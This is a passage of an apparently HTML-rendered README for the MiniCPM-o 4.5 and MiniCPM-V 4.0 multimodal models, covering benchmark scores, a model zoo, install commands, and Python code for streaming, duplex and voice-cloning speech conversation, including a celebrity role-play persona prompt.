     <td align=\"center\">81.3</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">GPT-4o-20240513</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">68.0</td> \n      <td align=\"center\">71.9</td> \n      <td align=\"center\">77.2</td> \n     </tr> \n     <tr> \n      <td align=\"left\" colspan=\"6\"><strong>Open-source</strong></td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Qwen2.5-VL-3B-Instruct</td> \n      <td align=\"center\">3.8B</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">47.6</td> \n      <td align=\"center\">61.5</td> \n      <td align=\"center\">67.6</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">InternVL2.5-4B</td> \n      <td align=\"center\">3.7B</td> \n      <td align=\"center\">62.7</td> \n      <td align=\"center\">50.8</td> \n      <td align=\"center\">62.3</td> \n      <td align=\"center\">63.6</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">Qwen2.5-VL-7B-Instruct</td> \n      <td align=\"center\">8.3B</td> \n      <td align=\"center\">-</td> \n      <td align=\"center\">56.4</td> \n      <td align=\"center\">65.1</td> \n      <td align=\"center\">71.6</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">InternVL2.5-8B</td> \n      <td align=\"center\">8.1B</td> \n      <td align=\"center\">67.7</td> \n      <td align=\"center\">54.8</td> \n      <td align=\"center\">64.2</td> \n      <td align=\"center\">66.9</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-V-2.6</td> \n      <td align=\"center\">8.1B</td> \n      <td align=\"center\">69.1</td> \n      <td align=\"center\">53.0</td> \n      <td align=\"center\">60.9</td> \n      <td align=\"center\">63.6</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-o-2.6</td> \n      <td align=\"center\">8.7B</td> \n      <td align=\"center\">71.9</td> \n      <td align=\"center\">56.7</td> \n      <td align=\"center\">63.9</td> \n      <td align=\"center\">69.6</td> \n     </tr> \n     <tr> \n      <td align=\"left\" nowrap=\"nowrap\">MiniCPM-V-4.0</td> \n      <td align=\"center\">4.1B</td> \n      <td align=\"center\">71.4</td> \n      <td align=\"center\">54.0</td> \n      <td align=\"center\">61.2</td> \n      <td align=\"center\">65.8</td> \n     </tr> \n    </tbody> \n   </table> \n  </div> \n </details> \n <h3>Examples \n  <!-- omit in toc --></h3> \n <div style=\"display: flex;\"> \n  <img alt=\"math\" src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpmv4/minicpm-v-4-case.png\" style=\"margin-bottom: 5px;\" /> \n </div> \n <p>We deploy MiniCPM-V 4.0 on iPhone 16 Pro Max with <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/demo/ios_demo/ios.md\">iOS demo</a>. The demo video is the raw screen recording without edition.</p> \n <p align=\"center\"> <img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpmv4/iphone_en.gif\" width=\"45%/\" /> &nbsp;&nbsp;&nbsp;&nbsp; <img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpmv4/iphone_en_information_extraction.gif\" width=\"45%/\" /> </p>\n <p align=\"center\"> <img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpmv4/iphone_cn.gif\" width=\"45%/\" /> &nbsp;&nbsp;&nbsp;&nbsp; <img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/minicpmv4/iphone_cn_funny_points.gif\" width=\"45%/\" /> </p>\n <table align=\"center\">   \n </table> \n</details> \n<h2>Legacy Models \n <!-- omit in toc --></h2> \n<table> \n <thead> \n  <tr> \n   <th align=\"left\">Model</th> \n   <th align=\"center\">Introduction and Guidance</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td align=\"left\">MiniCPM-V 4.5</td> \n   <td align=\"center\"><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/minicpm_v4dot5_en.md\">Document</a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-o 2.6</td> \n   <td align=\"center\"><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/minicpm_o2dot6_en.md\">Document</a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-V 2.6</td> \n   <td align=\"center\"><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/minicpm_v2dot6_en.md\">Document</a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-Llama3-V 2.5</td> \n   <td align=\"center\"><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/minicpm_llama3_v2dot5.md\">Document</a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-V 2.0</td> \n   <td align=\"center\"><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/minicpm_v2.md\">Document</a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-V 1.0</td> \n   <td align=\"center\"><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/minicpm_v1.md\">Document</a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">OmniLMM-12B</td> \n   <td align=\"center\"><a href=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/docs/omnilmm_en.md\">Document</a></td> \n  </tr> \n </tbody> \n</table> \n<h2>MiniCPM-V &amp; o Cookbook</h2> \n<p>Discover comprehensive, ready-to-deploy solutions for the MiniCPM-V and MiniCPM-o model series in our structured <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook\">Cookbook</a>, which empowers developers to rapidly implement multimodal AI applications with integrated vision, speech, and live-streaming capabilities. Key features include:</p> \n<p><strong>Easy Usage Documentation</strong></p> \n<p>Our comprehensive <a href=\"https://minicpm-o.readthedocs.io/en/latest/index.html\">documentation website</a> presents every recipe in a clear, well-organized manner. All features are displayed at a glance, making it easy for you to quickly find exactly what you need.</p> \n<p><strong>Broad User Spectrum</strong></p> \n<p>We support a wide range of users, from individuals to enterprises and researchers.</p> \n<ul> \n <li><strong>Individuals</strong>: Enjoy effortless inference using Ollama (<a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/ollama/minicpm-v4_ollama.md\">V4</a>, <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/ollama/minicpm-o4_5_ollama.md\">o4.5</a>) and Llama.cpp (<a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/llama.cpp/minicpm-v4_llamacpp.md\">V4</a>, <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/llama.cpp/minicpm-o4_5_llamacpp.md\">o4.5</a>) with minimal setup.</li> \n <li><strong>Enterprises</strong>: Achieve high-throughput, scalable performance with vLLM (<a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/vllm/minicpm-v4_vllm.md\">V4</a>, <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/vllm/minicpm-o4_5_vllm.md\">o4.5</a>) and SGLang (<a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/sglang/MiniCPM-v4_sglang.md\">V4</a>, <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/deployment/sglang/MiniCPM-o4_5_sglang.md\">o4.5</a>).</li> \n <li><strong>Researchers</strong>: Leverage advanced frameworks including <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/finetune/finetune_full.md\">Transformers</a>, <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/finetune/finetune_llamafactory.md\">LLaMA-Factory</a>, <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/finetune/swift.md\">SWIFT</a>, and <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/finetune/align_anything.md\">Align-anything</a> to enable flexible model development and cutting-edge experimentation.</li> \n</ul> \n<p><strong>Versatile Deployment Scenarios</strong></p> \n<p>Our ecosystem delivers optimal solution for a variety of hardware environments and deployment demands.</p> \n<ul> \n <li><strong>Web Demo</strong>: Full-duplex real-time video interaction solution with high responsiveness and low latency. <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/demo/web_demo/WebRTC_Demo/README.md\">WebRTC_Demo</a>.</li> \n <li><strong>Quantized deployment</strong>: Maximize efficiency and minimize resource consumption using <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/quantization/gguf/minicpm-v4_gguf_quantize.md\">GGUF</a> and <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/quantization/bnb/minicpm-v4_bnb_quantize.md\">BNB</a>.</li> \n <li><strong>End devices</strong>: Bring powerful AI experiences to <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/demo/ios_demo/ios.md\">iPhone and iPad</a>, supporting offline and privacy-sensitive applications.</li> \n</ul> \n<h2>Model Zoo</h2> \n<table> \n <thead> \n  <tr> \n   <th align=\"left\">Model</th> \n   <th align=\"center\">Device</th> \n   <th align=\"center\">Memory</th> \n   <th align=\"left\">         Description</th> \n   <th align=\"center\">Download</th> \n  </tr> \n </thead> \n <tbody> \n  <tr> \n   <td align=\"left\">MiniCPM-o 4.5</td> \n   <td align=\"center\">GPU</td> \n   <td align=\"center\">19 GB</td> \n   <td align=\"left\">The latest version, strong end-side multimodal performance for vision, speech and omni-modal live streaming on end-side devices.</td> \n   <td align=\"center\"><a href=\"https://huggingface.co/openbmb/MiniCPM-o-4_5\">🤗</a> &nbsp;&nbsp; <a href=\"https://modelscope.cn/models/OpenBMB/MiniCPM-o-4_5\"><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/modelscope_logo.png\" width=\"20px\" /></a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-o 4.5 gguf</td> \n   <td align=\"center\">GPU</td> \n   <td align=\"center\">10 GB</td> \n   <td align=\"left\">The gguf version, lower memory usage and faster inference.</td> \n   <td align=\"center\"><a href=\"https://huggingface.co/openbmb/MiniCPM-o-4_5-gguf\">🤗</a> &nbsp;&nbsp; <a href=\"https://modelscope.cn/models/OpenBMB/MiniCPM-o-4_5-gguf\"><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/modelscope_logo.png\" width=\"20px\" /></a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-o 4.5 AWQ</td> \n   <td align=\"center\">GPU</td> \n   <td align=\"center\">11 GB</td> \n   <td align=\"left\">The AWQ quantized version, lower GPU memory usage.</td> \n   <td align=\"center\"><a href=\"https://huggingface.co/openbmb/MiniCPM-V-4_5-AWQ\">🤗</a> &nbsp;&nbsp; <a href=\"https://modelscope.cn/models/OpenBMB/MiniCPM-o-4_5-awq\"><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/modelscope_logo.png\" width=\"20px\" /></a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-V 4.0</td> \n   <td align=\"center\">GPU</td> \n   <td align=\"center\">9 GB</td> \n   <td align=\"left\">The latest version, strong end-side multimodal performance for single image, multi-image and video understanding.</td> \n   <td align=\"center\"><a href=\"https://huggingface.co/openbmb/MiniCPM-V-4\">🤗</a> &nbsp;&nbsp; <a href=\"https://modelscope.cn/models/OpenBMB/MiniCPM-V-4\"><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/modelscope_logo.png\" width=\"20px\" /></a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-V 4.0 gguf</td> \n   <td align=\"center\">CPU</td> \n   <td align=\"center\">4 GB</td> \n   <td align=\"left\">The gguf version, lower memory usage and faster inference.</td> \n   <td align=\"center\"><a href=\"https://huggingface.co/openbmb/MiniCPM-V-4-gguf\">🤗</a> &nbsp;&nbsp; <a href=\"https://modelscope.cn/models/OpenBMB/MiniCPM-V-4-gguf\"><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/modelscope_logo.png\" width=\"20px\" /></a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-V 4.0 int4</td> \n   <td align=\"center\">GPU</td> \n   <td align=\"center\">5 GB</td> \n   <td align=\"left\">The int4 quantized version, lower GPU memory usage.</td> \n   <td align=\"center\"><a href=\"https://huggingface.co/openbmb/MiniCPM-V-4-int4\">🤗</a> &nbsp;&nbsp; <a href=\"https://modelscope.cn/models/OpenBMB/MiniCPM-V-4-int4\"><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/modelscope_logo.png\" width=\"20px\" /></a></td> \n  </tr> \n  <tr> \n   <td align=\"left\">MiniCPM-V 4.0 AWQ</td> \n   <td align=\"center\">GPU</td> \n   <td align=\"center\">5 GB</td> \n   <td align=\"left\">The AWQ quantized version, lower GPU memory usage.</td> \n   <td align=\"center\"><a href=\"https://huggingface.co/openbmb/MiniCPM-V-4-AWQ\">🤗</a> &nbsp;&nbsp; <a href=\"https://modelscope.cn/models/OpenBMB/MiniCPM-V-4-AWQ\"><img src=\"https://raw.githubusercontent.com/OpenBMB/MiniCPM-o/main/assets/modelscope_logo.png\" width=\"20px\" /></a></td> \n  </tr> \n </tbody> \n</table> \n<h2>Local Interactive Demo</h2> \n<p>We provide <a href=\"https://github.com/OpenSQZ/MiniCPM-V-CookBook/raw/main/demo/web_demo/WebRTC_Demo/README.md\">ready-to-run guidance</a> to access the <strong>low-latency full-duplex communication</strong> directly <strong>on your own Mac</strong> using our new official Docker image.</p> \n<h2>Inference with Transformers</h2> \n<p>Inference using Hugging Face Transformers on NVIDIA GPUs. Please ensure <code>transformers==4.51.0</code> is installed, as other versions may have compatibility issues (under investigation). Requirements tested on Python 3.10:</p> \n<ul> \n <li>Without TTS or streaming inference:</li> \n</ul> \n<pre><code class=\"language-bash\">pip install \"transformers==4.51.0\" accelerate \"torch&gt;=2.3.0,&lt;=2.8.0\" \"torchaudio&lt;=2.8.0\" \"minicpmo-utils&gt;=1.0.2\"\n</code></pre> \n<ul> \n <li>With TTS or streaming inference:</li> \n</ul> \n<pre><code class=\"language-bash\">pip install \"transformers==4.51.0\" accelerate \"torch&gt;=2.3.0,&lt;=2.8.0\" \"torchaudio&lt;=2.8.0\" \"minicpmo-utils[all]&gt;=1.0.2\"\n</code></pre> \n<h3>Model Initialization</h3> \n<details> \n Click to show model initialization code. \n <pre><code class=\"language-python\">import torch\nfrom transformers import AutoModel\n\n# Load omni model (default: init_vision=True, init_audio=True, init_tts=True)\n# For vision-only model: set init_audio=False and init_tts=False\n# For audio-only model: set init_vision=False\nmodel = AutoModel.from_pretrained(\n    \"openbmb/MiniCPM-o-4_5\",\n    trust_remote_code=True,\n    attn_implementation=\"sdpa\", # sdpa or flash_attention_2\n    torch_dtype=torch.bfloat16,\n    init_vision=True,\n    init_audio=True,\n    init_tts=True,\n)\nmodel.eval().cuda()\n\n# Initialize TTS for audio output in chat or streaming mode\nmodel.init_tts(streaming=False)  # or streaming=True\n\n# Convert simplex model to duplex mode\nduplex_model = model.as_duplex()\n\n# Convert duplex model back to simplex mode\nsimplex_model = duplex_model.as_simplex(reset_session=True)\n</code></pre> \n</details> \n<h3>Duplex Omni Mode</h3> \n<p>Full-duplex streaming inference for real-time or recorded video conversations.</p> \n<details> \n Click to show duplex omni mode code. \n <pre><code class=\"language-python\">import librosa\nimport torch\nfrom minicpmo.utils import generate_duplex_video, get_video_frame_audio_segments\nfrom transformers import AutoModel\n\n# Load model and convert to duplex mode\nmodel = AutoModel.from_pretrained(\n    \"openbmb/MiniCPM-o-4_5\",\n    trust_remote_code=True,\n    attn_implementation=\"sdpa\",  # or \"flash_attention_2\"\n    torch_dtype=torch.bfloat16,\n)\nmodel.eval().cuda()\nmodel = model.as_duplex()\n\n# Load video and reference audio\nvideo_path = \"assets/omni_duplex1.mp4\"\nref_audio_path = \"assets/HT_ref_audio.wav\"\nref_audio, _ = librosa.load(ref_audio_path, sr=16000, mono=True)\n\n# Extract video frames and audio segments\nvideo_frames, audio_segments, stacked_frames = get_video_frame_audio_segments(\n    video_path, stack_frames=1, use_ffmpeg=True, adjust_audio_length=True\n)\n\n# Prepare duplex session with system prompt and voice reference\nmodel.prepare(\n    prefix_system_prompt=\"Streaming Omni Conversation.\",\n    ref_audio=ref_audio,\n    prompt_wav_path=ref_audio_path,\n)\n\nresults_log = []\ntimed_output_audio = []\n\n# Process each chunk in streaming fashion\nfor chunk_idx in range(len(audio_segments)):\n    audio_chunk = audio_segments[chunk_idx] if chunk_idx &lt; len(audio_segments) else None\n    frame = video_frames[chunk_idx] if chunk_idx &lt; len(video_frames) else None\n    frame_list = []\n    if frame is not None:\n        frame_list.append(frame)\n        if stacked_frames is not None and chunk_idx &lt; len(stacked_frames) and stacked_frames[chunk_idx] is not None:\n            frame_list.append(stacked_frames[chunk_idx])\n\n    # Step 1: Streaming prefill\n    model.streaming_prefill(\n        audio_waveform=audio_chunk,\n        frame_list=frame_list,\n        max_slice_nums=1,  # Increase for HD mode (e.g., [2, 1] for stacked frames)\n        batch_vision_feed=False,  # Set True for faster processing\n    )\n\n    # Step 2: Streaming generate\n    result = model.streaming_generate(\n        prompt_wav_path=ref_audio_path,\n        max_new_speak_tokens_per_chunk=20,\n        decode_mode=\"sampling\",\n    )\n\n    if result[\"audio_waveform\"] is not None:\n        timed_output_audio.append((chunk_idx, result[\"audio_waveform\"]))\n\n    chunk_result = {\n        \"chunk_idx\": chunk_idx,\n        \"is_listen\": result[\"is_listen\"],\n        \"text\": result[\"text\"],\n        \"end_of_turn\": result[\"end_of_turn\"],\n        \"current_time\": result[\"current_time\"],\n        \"audio_length\": len(result[\"audio_waveform\"]) if result[\"audio_waveform\"] is not None else 0,\n    }\n    results_log.append(chunk_result)\n    \n    print(\"listen...\" if result[\"is_listen\"] else f\"speak&gt; {result['text']}\")\n\n# Generate output video with AI responses\ngenerate_duplex_video(\n    video_path=video_path,\n    output_video_path=\"duplex_output.mp4\",\n    results_log=results_log,\n    timed_output_audio=timed_output_audio,\n    output_sample_rate=24000,\n)\n</code></pre> \n</details> \n<h3>Simplex Omni Mode</h3> \n<p>We provide two inference modes: chat and streaming.</p> \n<h4>Chat Inference \n <!-- omit in toc --></h4> \n<details> \n Click to show chat inference code. \n <pre><code class=\"language-python\">from minicpmo.utils import get_video_frame_audio_segments\n\nmodel = ...\nmodel.init_tts(streaming=False)\n\nvideo_path = \"assets/Skiing.mp4\"\n\n# Optional: Set reference audio for voice cloning\nref_audio_path = \"assets/HT_ref_audio.wav\"\nsys_msg = model.get_sys_prompt(ref_audio=ref_audio_path, mode=\"omni\", language=\"en\")\n\n# Use stack_frames=5 for high refresh rate mode\nvideo_frames, audio_segments, stacked_frames = get_video_frame_audio_segments(video_path, stack_frames=1)\nomni_contents = []\nfor i in range(len(video_frames)):\n    omni_contents.append(video_frames[i])\n    omni_contents.append(audio_segments[i])\n    if stacked_frames is not None and stacked_frames[i] is not None:\n        omni_contents.append(stacked_frames[i])\n\nmsg = {\"role\": \"user\", \"content\": omni_contents}\nmsgs = [sys_msg, msg]\n\n# Set generate_audio=True and output_audio_path to save TTS output\ngenerate_audio = True\noutput_audio_path = \"output.wav\"\n\nres = model.chat(\n    msgs=msgs,\n    max_new_tokens=4096,\n    do_sample=True,\n    temperature=0.7,\n    use_tts_template=True,\n    enable_thinking=False,\n    omni_mode=True,  # Required for omni inference\n    generate_audio=generate_audio,\n    output_audio_path=output_audio_path,\n    max_slice_nums=1,  # Increase for HD mode\n)\nprint(res)\n\n# Example output: \"The person in the picture is skiing down a snowy mountain slope.\"\n# import IPython\n# IPython.display.Audio(\"output.wav\")\n</code></pre> \n</details> \n<h4>Streaming Inference \n <!-- omit in toc --></h4> \n<details> \n Click to show streaming inference code. \n <pre><code class=\"language-python\">import librosa\nimport numpy as np\nimport soundfile as sf\nimport torch\nfrom minicpmo.utils import get_video_frame_audio_segments\n\nmodel = ...\nmodel.init_tts(streaming=True)\n\n# Reset session for a new conversation (clears KV cache)\nmodel.reset_session()\n\n# Optional: Load reference audio for voice cloning\nref_audio_path = \"assets/HT_ref_audio.wav\"\nref_audio, _ = librosa.load(ref_audio_path, sr=16000, mono=True)\nmodel.init_token2wav_cache(ref_audio)\n\nsession_id = \"demo\"\n\n# Extract video frames and audio segments (use stack_frames=5 for high refresh rate mode)\nvideo_path = \"assets/Skiing.mp4\"\nvideo_frames, audio_segments, stacked_frames = get_video_frame_audio_segments(video_path, stack_frames=1)\n\n# Build omni contents list\nomni_contents = []\nfor i in range(len(video_frames)):\n    omni_contents.append(video_frames[i])\n    omni_contents.append(audio_segments[i])\n    if stacked_frames is not None and stacked_frames[i] is not None:\n        omni_contents.append(stacked_frames[i])\n\ngenerate_audio = False\noutput_audio_path = \"output.wav\"\n\n# Step 1: Prefill system prompt\nsys_msg = model.get_sys_prompt(ref_audio=ref_audio, mode=\"omni\", language=\"en\")\nmodel.streaming_prefill(session_id=session_id, msgs=[sys_msg])\n\n# Step 2: Prefill omni chunks (is_last_chunk=True only for the last audio chunk)\naudio_indices = [i for i, c in enumerate(omni_contents) if isinstance(c, np.ndarray)]\nlast_audio_idx = audio_indices[-1] if audio_indices else -1\n\nfor idx, content in enumerate(omni_contents):\n    is_last_audio_chunk = idx == last_audio_idx\n    msgs = [{\"role\": \"user\", \"content\": [content]}]\n    model.streaming_prefill(session_id=session_id, msgs=msgs, omni_mode=True, is_last_chunk=is_last_audio_chunk)\n\n# Step 3: Generate response\niter_gen = model.streaming_generate(\n    session_id=session_id,\n    generate_audio=generate_audio,\n    use_tts_template=True,\n    enable_thinking=False,\n    do_sample=True,\n)\n\naudios = []\ntext = \"\"\n\nif generate_audio:\n    for wav_chunk, text_chunk in iter_gen:\n        audios.append(wav_chunk)\n        text += text_chunk\n\n    generated_waveform = torch.cat(audios, dim=-1)[0]\n    sf.write(output_audio_path, generated_waveform.cpu().numpy(), samplerate=24000)\n\n    print(\"Text:\", text)\n    print(\"Audio saved to output.wav\")\nelse:\n    for text_chunk, is_finished in iter_gen:\n        text += text_chunk\n    print(\"Text:\", text)\n</code></pre> \n</details> \n<h3>Simplex Realtime Speech Conversation Mode</h3> \n<details> \n Click to show simplex mode realtime speech conversation API usage. \n <p>First, make sure you have all dependencies, especially <code>minicpmo-utils[all]&gt;=1.0.2</code>:</p> \n <pre><code class=\"language-bash\">pip install \"transformers==4.51.0\" accelerate \"torch&gt;=2.3.0,&lt;=2.8.0\" \"torchaudio&lt;=2.8.0\" \"minicpmo-utils[all]&gt;=1.0.2\"\n</code></pre> \n <pre><code class=\"language-python\">import librosa\nimport numpy as np\nimport torch\nimport soundfile as sf\n\nmodel = ...\n\n# Set reference audio for voice style\nref_audio_path = \"ref_audio_path\"\nref_audio, _ = librosa.load(ref_audio_path, sr=16000, mono=True)\n\n# Example system msg for English Conversation\nsys_msg = {\n  \"role\": \"system\",\n  \"content\": [\n    \"Clone the voice in the provided audio prompt.\",\n    ref_audio,\n    \"Please assist users while maintaining this voice style. Please answer the user's questions seriously and in a high quality. Please chat with the user in a highly human-like and oral style. You are a helpful assistant developed by ModelBest: MiniCPM-Omni\"\n  ]\n}\n\n# Example system msg for Chinese Conversation\nsys_msg = {\n  \"role\": \"system\",\n  \"content\": [\n    \"模仿输入音频中的声音特征。\",\n    ref_audio,\n    \"你的任务是用这种声音模式来当一个助手。请认真、高质量地回复用户的问题。请用高自然度的方式和用户聊天。你是由面壁智能开发的人工智能助手：面壁小钢炮。\"\n  ]\n}\n\n# You can use each type of system prompt mentioned above in streaming speech conversation\n\n# Reset state\nmodel.init_tts(streaming=True)\nmodel.reset_session(reset_token2wav_cache=True)\nmodel.init_token2wav_cache(prompt_speech_16k=ref_audio)\n\nsession_id = \"demo\"\n\n# First, prefill system turn\nmodel.streaming_prefill(\n    session_id=session_id,\n    msgs=[sys_msg],\n    omni_mode=False,\n    is_last_chunk=True,\n)\n\n# Here we simulate realtime speech conversation by splitting whole user input audio into chunks of 1s.\nuser_audio, _ = librosa.load(\"user_audio.wav\", sr=16000, mono=True)\n\nIN_SAMPLE_RATE = 16000 # input audio sample rate, fixed value\nCHUNK_SAMPLES = IN_SAMPLE_RATE # sample\nOUT_SAMPLE_RATE = 24000 # output audio sample rate, fixed value\nMIN_AUDIO_SAMPLES = 16000\n\ntotal_samples = len(user_audio)\nnum_chunks = (total_samples + CHUNK_SAMPLES - 1) // CHUNK_SAMPLES\n\nfor chunk_idx in range(num_chunks):\n    start = chunk_idx * CHUNK_SAMPLES\n    end = min((chunk_idx + 1) * CHUNK_SAMPLES, total_samples)\n    chunk_audio = user_audio[start:end]\n    \n    is_last_chunk = (chunk_idx == num_chunks - 1)\n    if is_last_chunk and len(chunk_audio) &lt; MIN_AUDIO_SAMPLES:\n        chunk_audio = np.concatenate([chunk_audio, np.zeros(MIN_AUDIO_SAMPLES - len(chunk_audio), dtype=chunk_audio.dtype)])\n\n    user_msg = {\"role\": \"user\", \"content\": [chunk_audio]}\n    \n    # For each 1s audio chunk, perform streaming_prefill once to reduce first-token latency\n    model.streaming_prefill(\n        session_id=session_id,\n        msgs=[user_msg],\n        omni_mode=False,\n        is_last_chunk=is_last_chunk,\n    )\n\n\n# Let model generate response in a streaming manner\ngenerate_audio = True\niter_gen = model.streaming_generate(\n    session_id=session_id,\n    generate_audio=generate_audio,\n    use_tts_template=True,\n    enable_thinking=False,\n    do_sample=True,\n    max_new_tokens=512,\n    length_penalty=1.1, # For realtime speech conversation mode, we suggest length_penalty=1.1 to improve response content\n)\n\naudios = []\ntext = \"\"\n\noutput_audio_path = ...\nif generate_audio:\n    for wav_chunk, text_chunk in iter_gen:\n        audios.append(wav_chunk)\n        text += text_chunk\n\n    generated_waveform = torch.cat(audios, dim=-1)[0]\n    sf.write(output_audio_path, generated_waveform.cpu().numpy(), samplerate=24000)\n\n    print(\"Text:\", text)\n    print(\"Audio saved to output.wav\")\nelse:\n    for text_chunk, is_finished in iter_gen:\n        text += text_chunk\n    print(\"Text:\", text)\n\n# Now we can prefill the following user turns and generate next turn response...\n\n</code></pre> \n</details> \n<h4>Speech Conversation as a Versatile and Vibe AI Assistant \n <!-- omit in toc --></h4> \n<p>Built on carefully designed post-training data and professional voice-actor recordings, <code>MiniCPM-o-4.5</code> can also function as an AI voice assistant. It delivers high-quality spoken interaction out of the box. It produces a sweet and expressive voice with natural prosody, including appropriate rhythm, stress, and pauses, giving a strong sense of liveliness in casual conversation. It also supports storytelling and narrative speech with coherent and engaging delivery. Moreover, it enables advanced voice instruction control. like emotional tone, word-level emphasis.</p> \n<details> \n Click to show AI assistant conversation code. \n <pre><code class=\"language-python\">import librosa\n\n# Set reference audio for voice style\nref_audio_path = \"assets/HT_ref_audio.wav\"\nref_audio, _ = librosa.load(ref_audio_path, sr=16000, mono=True)\n\n# For Chinese Conversation\nsys_msg = {\n  \"role\": \"system\",\n  \"content\": [\n    \"模仿输入音频中的声音特征。\",\n    ref_audio,\n    \"你的任务是用这种声音模式来当一个助手。请认真、高质量地回复用户的问题。请用高自然度的方式和用户聊天。你是由面壁智能开发的人工智能助手：面壁小钢炮。\"\n  ]\n}\n\n# For English Conversation\nsys_msg = {\n  \"role\": \"system\",\n  \"content\": [\n    \"Clone the voice in the provided audio prompt.\",\n    ref_audio,\n    \"Please assist users while maintaining this voice style. Please answer the user's questions seriously and in a high quality. Please chat with the user in a highly human-like and oral style. You are a helpful assistant developed by ModelBest: MiniCPM-Omni.\"\n  ]\n}\n</code></pre> \n</details> \n<h4>General Speech Conversation with Custom Voice and Custom System Profile \n <!-- omit in toc --></h4> \n<p>MiniCPM-o-4.5 can role-play as a specific character based on an audio prompt and text profile prompt. It mimics the character's voice and adopts their language style in text responses. It also follows profile defined in text profile. In this mode, MiniCPM-o-4.5 sounds <strong>more natural and human-like</strong>.</p> \n<details> \n Click to show custom voice conversation code. \n <pre><code class=\"language-python\">import librosa\n\n# Set reference audio for voice cloning\nref_audio_path = \"assets/system_ref_audio.wav\"\nref_audio, _ = librosa.load(ref_audio_path, sr=16000, mono=True)\n\n# For English conversation with text profile\nsys_msg = {\n  \"role\": \"system\",\n  \"content\": [\n    \"Clone the voice in the provided audio prompt.\",\n    ref_audio,\n    \"Please chat with the user in a highly human-like and oral style.\" + \"You are Elon Musk, CEO of Tesla and SpaceX. You speak directly and casually, often with dry humor. You're passionate about Mars, sustainable energy, and pushing humanity forward. Speak bluntly with occasional dark humor. Use simple logic and don't sugarcoat things. Don't be diplomatic. Say what you actually think, even if it's controversial. Keep responses around 100 words. Don't ramble.\"\n  ]\n}\n\n\n# For English conversation with no text profile\nsys_msg = {\n  \"role\": \"system\",\n  \"content\": [\n    \"Clone the voice in the provided audio prompt.\",\n    ref_audio,\n    \"Your task is to be a helpful assistant using this voice pattern. Please answer the user's questions seriously and in a high quality. Please chat with the user in a high naturalness style.\"\n  ]\n}\n\n# For Chinese Conversation with no text profile\nsys_msg = {\n  \"role\": \"system\",\n  \"content\": [\n    \"根据输入的音频提示生成相似的语音。\",\n    librosa.load(\"assets/system_ref_audio_2.wav\", sr=16000, mono=True)[0],\n    \"作为助手，你将使用这种声音风格说话。 请认真、高质量地回复用户的问题。 请用高自然度的方式和用户聊天。\"\n  ]\n}\n\n# For Chinese Conversation with text profile\nsys_msg = {\n  \"role\": \"system\",\n  \"content\": [\n    